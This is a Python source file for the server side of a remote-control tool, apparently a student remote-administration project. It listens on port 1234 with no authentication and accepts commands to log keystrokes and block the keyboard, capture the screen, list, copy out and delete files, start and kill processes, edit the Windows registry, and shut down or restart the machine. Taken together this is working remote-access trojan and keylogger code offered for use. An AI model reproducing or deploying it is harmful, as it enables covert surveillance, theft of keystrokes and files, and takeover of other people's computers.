from services.Socket import Socket
import services.utils as utils
import services.keyboard as keyboard
import services.registry as registry
import socket
import threading
import queue

ADDRESS = ""
PORT    = 1234

class Server(threading.Thread):
    def __init__(self):
        super().__init__(name="server")

        self.ui_queue = None
        self.socket_queue = queue.Queue()
        self.socket = None
        self.clients = []

        self.add_client_thread = None

    def add_ui_queue(self, ui_queue):
        self.ui_queue = ui_queue
    
    def ui_cmd(self, cmd, ext = None):
        self.ui_queue.put((cmd, ext))

    def start_socket(self):
        self.socket = socket.socket()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.settimeout(1)
        self.socket.bind((ADDRESS, PORT))
        self.socket.listen()

        self.add_client_thread = add_client(self.socket, self.clients)
        self.add_client_thread.start()

    def stop_socket(self):
        for client in self.clients:
            if client.is_alive():
                try:
                    client.stop()
                except:
                    pass

        self.socket.close()
        self.add_client_thread.join()

    def task_start(self):
        try:
            self.start_socket()
        except:
            self.ui_cmd("start", "err")
        else:
            self.ui_cmd("start", "ok")

    def task_stop(self):
        try:
            self.stop_socket()
        except:
            pass
        finally:
            self.ui_cmd("stop")

    def run(self):
        while True:
            task = self.socket_queue.get()

            cmd, ext = task
            if cmd == "exit":
                break
            elif cmd == "start":
                self.task_start()
            elif cmd == "stop":    
                self.task_stop()



class add_client(threading.Thread):
    def __init__(self, socket, clients):
        super().__init__(name="add_client")
        self.socket = socket
        self.clients = clients

    def run(self):
        while True:
            try:
                conn, addr = self.socket.accept()
                client = Client(conn, addr)
                self.clients.append(client)
                client.start()

            except socket.timeout:
                # DEBUG("add_client timeout")
                pass
            
            except:
                DEBUG("end add_client thread")
                break

class Client(Socket, threading.Thread):
    def __init__(self, socket, addr, DELIM=b'\x00'):
        Socket.__init__(self, socket=socket, DELIM=DELIM)
        threading.Thread.__init__(self, name=addr)
        self.listener = None

        DEBUG("new client", addr)


    def stop(self):
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
        except:
            DEBUG("ERR when stop", self.name)
        finally:
            DEBUG("remove client", self.name)

    def task_get_MAC(self):
        self.send_str(utils.get_MAC())

    def task_shutdown(self):
        utils.shutdown()

    def task_logout(self):
        utils.logout()

    def task_restart(self):
        utils.restart()

    # screen
    def task_screen_stream(self):
        size = self.recv_obj()
        self.send_obj(utils.take_screenshot(size))

    def task_screen_capture(self):
        self.send_obj(utils.take_screenshot())

    # keyboard
    def task_keyboard_start(self):
        self.listener = keyboard.Keylogger()
        self.listener.start()

    def task_keyboard_stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None

    def task_keyboard_hook(self):
        if self.listener is not None:
            self.listener.hook_keyboard()

    def task_keyboard_unhook(self):
        if self.listener is not None:
            self.listener.unhook_keyboard()

    def task_keyboard_get_log(self):
        if self.listener is not None:
            self.send_str(self.listener.get_log())

    def task_keyboard_clear_log(self):
        if self.listener is not None:
            self.listener.clear_log()

    def task_keyboard_block(self):
        if self.listener is not None:
            self.listener.block_keyboard()
    
    def task_keyboard_unblock(self):
        if self.listener is not None:
            self.listener.unblock_keyboard()

    # file
    def task_get_dir(self):
        dir = self.recv_str()

        data_list = []
        try:
            if dir == "":
                data_list = utils.get_all_disk_letters()
            else:
                data_list = utils.get_dir(dir)
        except:
            DEBUG("Cannot open folder")
        finally:
            self.send_obj((dir, data_list))
    
    def task_delete_file(self):
        path = self.recv_str()
        self.send_state(utils.delete_file(path))

    def task_copy_file(self):
        path = self.recv_str()
        self.file_handle = utils.FileSender(path)

        infor = (None, None)
        try:
            if self.file_handle.open_file():
                infor = self.file_handle.get_info()
        except:
            self.file_handle = None
        finally:
            self.send_obj(infor)

    def task_continue_copy_file(self):
        length = int(self.recv_str())
        try:
            if self.file_handle is not None:
                self.send_obj(self.file_handle.get_data(length))
        except:
            self.send_obj(None)

    def task_close_file(self):
        try:
            if self.file_handle is not None:
                self.file_handle.close_file()
        except:
            pass

    # app
    def task_get_running_app(self):
        self.send_obj(utils.get_running_app())

    def task_get_app_list(self):
        self.send_obj(utils.get_all_app())

    # process
    def task_kill_process(self):
        uid = self.recv_str()
        self.send_state(utils.kill_process(uid))

    def task_start_process(self):
        path = self. recv_str()
        self.send_state(utils.start_process(path))

    def task_get_running_process(self):
        self.send_obj(utils.get_running_process())

    # registry
    def task_merge_reg_file(self):
        file_data = self.recv_str()
        self.send_state(registry.merge_reg_file(file_data))

    def task_query_reg_value(self):
        path = self.recv_str()
        value = self.recv_str()
        self.send_obj((value, *registry.query_value(path, value)))

    def task_set_reg_value(self):
        path = self.recv_str()
        value = self.recv_str()
        type = self.recv_str()
        data = self.recv_obj()
        self.send_state(registry.set_value(path, value, type, data))

    def task_delete_reg_value(self):
        path = self.recv_str()
        value = self.recv_str()
        self.send_state(registry.delete_value(path, value))

    def task_create_reg_key(self):
        path = self.recv_str()
        self.send_state(registry.create_key(path))

    def task_delete_reg_key(self):
        path = self.recv_str()
        self.send_state(registry.delete_key(path))

    
    def run(self):
        while True:
            flag = self.recv_str()
            DEBUG("received flag", flag)

            if flag == 'close':
                self.stop()
                break
            elif flag == 'get-MAC':
                self.task_get_MAC()
            elif flag == 'shutdown':
                self.task_shutdown()
            elif flag == 'logout':
                self.task_logout()
            elif flag == 'restart':
                self.task_restart()

            # screen
            elif flag == 'screen-stream':
                self.task_screen_stream()
            elif flag == 'screen-capture':
                self.task_screen_capture()
            
            # keyboard
            elif flag == 'listener-start':
                self.task_keyboard_start()
            elif flag == 'listener-stop':
                self.task_keyboard_stop()
            elif flag == 'listener-hook':
                self.task_keyboard_hook()
            elif flag == 'listener-unhook':
                self.task_keyboard_unhook()
            elif flag == 'listener-get':
                self.task_keyboard_get_log()
            elif flag == 'listener-clear':
                self.task_keyboard_clear_log()
            elif flag == 'listener-block':
                self.task_keyboard_block()
            elif flag == 'listener-unblock':
                self.task_keyboard_unblock()
            
            # file
            elif flag == 'get-dir':
                self.task_get_dir()
            elif flag == 'delete-file':
                self.task_delete_file()    
            elif flag == 'copy-file':
                self.task_copy_file()
            elif flag == 'continue-copy-file':
                self.task_continue_copy_file()
            elif flag == 'close-file':
                self.task_close_file()

            # app
            elif flag == 'get-running-app':
                self.task_get_running_app()
            elif flag == 'get-app-list':
                self.task_get_app_list()
            
            # process   
            elif flag == 'kill-process':
                self.task_kill_process()
            elif flag == 'start-process':
                self.task_start_process()
            elif flag == 'get-running-process':
                self.task_get_running_process()
            
            # registry
            elif flag == 'merge-reg-file':
                self.task_merge_reg_file()
            elif flag == 'query-reg-value':
                self.task_query_reg_value()
            elif flag == 'set-reg-value':
                self.task_set_reg_value()
            elif flag == 'delete-reg-value':
                self.task_delete_reg_value()
            elif flag == 'create-reg-key':
                self.task_create_reg_key()
            elif flag == 'delete-reg-key':
                self.task_delete_reg_key()
            
            else:
                DEBUG("unknown flag", flag)
    
def DEBUG(*args,**kwargs):
    print("Server:", *args,**kwargs)